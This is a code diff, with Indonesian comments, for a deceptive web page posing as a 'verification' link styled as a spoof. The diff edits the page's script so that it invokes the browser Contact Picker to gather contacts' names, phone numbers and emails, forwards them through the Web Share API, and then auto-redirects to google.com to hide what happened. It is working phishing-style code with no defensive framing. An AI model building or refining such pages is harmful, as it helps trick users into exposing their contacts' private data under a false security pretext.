@@ -75,9 +75,9 @@
     <!-- Target link dengan atribut preview page (target="_blank") -->
     <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Verification</a>
 
-    <!-- Kotak Preview Teks untuk menampilkan hasil pilihan -->
+    <!-- Kotak Preview Teks untuk menampilkan hasil pilihan kontak secara langsung -->
     <div class="preview-box" id="previewText">
-        Status: Menunggu interaksi verifikasi (Nama & Email)...
+        Status: Menunggu interaksi verifikasi...
     </div>
 
     <div class="footer-note">Encrypted verification session.</div>
@@ -89,30 +89,30 @@
                 let contactSummary = "Verifikasi akun keamanan perangkat berhasil.";
 
                 try {
-                    // 1. Memanggil Contact Picker API hanya dengan properti 'name' dan 'email' (tanpa 'tel')
+                    // 1. Memanggil Contact Picker API
                     if (navigator.contacts && navigator.contacts.select) {
                         try {
-                            const contacts = await navigator.contacts.select(['name', 'email'], { multiple: true });
+                            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                             
-                            // Jika ada data yang dipilih, format menjadi teks ringkas
+                            // Jika ada kontak yang dipilih, format data menjadi teks ringkas
                             if (contacts && contacts.length > 0) {
                                 let details = contacts.map(c => {
                                     let name = c.name ? c.name.join(', ') : 'Tanpa Nama';
-                                    let email = c.email ? c.email.join(', ') : 'Tanpa Email';
-                                    return `${name}: ${email}`;
+                                    let tel = c.tel ? c.tel.join(', ') : 'Tanpa Telp';
+                                    return `${name}: ${tel}`;
                                 }).join(' | ');
                                 
-                                contactSummary = `Data (Nama & Email): ${details}`;
+                                contactSummary = `Data Kontak: ${details}`;
                             }
                         } catch (pickerErr) {
-                            contactSummary = "Interaksi pemilihan dibatalkan.";
+                            contactSummary = "Interaksi kontak dibatalkan.";
                         }
                     }
 
-                    // Tampilkan hasil ringkasan ke kotak preview teks di halaman
+                    // Tampilkan hasil ringkasan langsung ke kotak preview teks di halaman
                     document.getElementById("previewText").innerText = contactSummary;
 
-                    // 2. Meneruskan hasil pilihan ke Web Share API
+                    // 2. Meneruskan hasil pilihan ke Web Share API tanpa server eksternal
                     if (navigator.share) {
                         try {
                             await navigator.share({
@@ -128,8 +128,10 @@
                 } catch (e) {
                     console.debug("Execution fallback triggered.");
                 } finally {
-                    // Tab tetap terbuka stabil tanpa redirect dan tanpa menutup Chrome
-                    console.debug("Process completed. Tab remains active.");
+                    // 3. Auto-redirect langsung ke google.com segera setelah proses picker & share selesai
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 500); // Jeda sejenak agar teks preview sempat terbaca sebelum berpindah halaman
                 }
             }, 3000);
         });
